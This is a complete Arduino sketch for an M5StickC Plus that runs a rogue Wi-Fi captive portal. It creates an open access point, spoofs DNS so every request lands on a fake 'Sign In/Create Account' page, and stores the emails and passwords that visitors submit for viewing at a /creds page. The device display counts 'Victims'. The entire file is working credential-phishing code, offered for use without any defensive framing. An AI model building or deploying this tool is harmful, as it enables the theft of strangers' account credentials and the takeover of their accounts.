#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// User configuration
#define SSID_NAME "________ Wireless"
#define SUBTITLE "________ Wireless Portal"
#define TITLE "Sign In/Create Account:"
#define BODY "Please Sign In/Create Account to continue to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to a minute for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

int capcount=0;
int BUILTIN_LED = 10;

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(192, 168, 0, 1); // Gateway

String Credentials = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer; WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}

String footer() {
  return
    "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
         "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in/Create Account\"></form></center>" + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  Credentials = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while (count < 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  M5.begin();
  M5.Lcd.setRotation(1);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setSwapBytes(true);
  M5.Lcd.setTextSize(1.5);

  M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
  M5.Lcd.setCursor(0, 10);
  M5.Lcd.setTextSize(2);
  M5.Lcd.print("Captive Portal");

  M5.Lcd.setTextColor(DARKGREY, TFT_BLACK);
  M5.Lcd.setCursor(0, 30);
  M5.Lcd.print("WiFi IP: ");
  M5.Lcd.print(APIP);

  M5.Lcd.setTextColor(DARKGREY, TFT_BLACK);
  M5.Lcd.setCursor(0, 50);
  M5.Lcd.print("Victim Count: ");
  M5.Lcd.print(capcount);

  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)

  webServer.on("/post", []() {
    capcount=capcount+1;
    webServer.send(HTTP_CODE, "text/html", posted());
    M5.Lcd.setTextColor(WHITE, TFT_BLACK);
    M5.Lcd.setCursor(0, 110);
    M5.Lcd.print("status: ");
    M5.Lcd.print("Victim In");
    BLINK();
    M5.Lcd.fillScreen(BLACK);
  });

  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());

  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();

    //M5.Lcd.fillScreen(BLACK);
    //M5.Lcd.setSwapBytes(true);
    //M5.Lcd.setTextSize(1.5);

    M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
    M5.Lcd.setCursor(0, 10);
    M5.Lcd.setTextSize(2);
    M5.Lcd.print("Captive Portal");

    M5.Lcd.setTextColor(DARKGREY, TFT_BLACK);
    M5.Lcd.setCursor(0, 30);
    M5.Lcd.print("WiFi IP: ");
    M5.Lcd.print(APIP);

    M5.Lcd.setTextColor(DARKGREY, TFT_BLACK);
    M5.Lcd.setCursor(0, 50);
    M5.Lcd.print("Victim Count: ");
    if (capcount < 1) {
      M5.Lcd.setTextColor(RED);
    } else {
      M5.Lcd.setTextColor(WHITE);
    }
    M5.Lcd.print(capcount);
  }
  dnsServer.processNextRequest(); webServer.handleClient();
}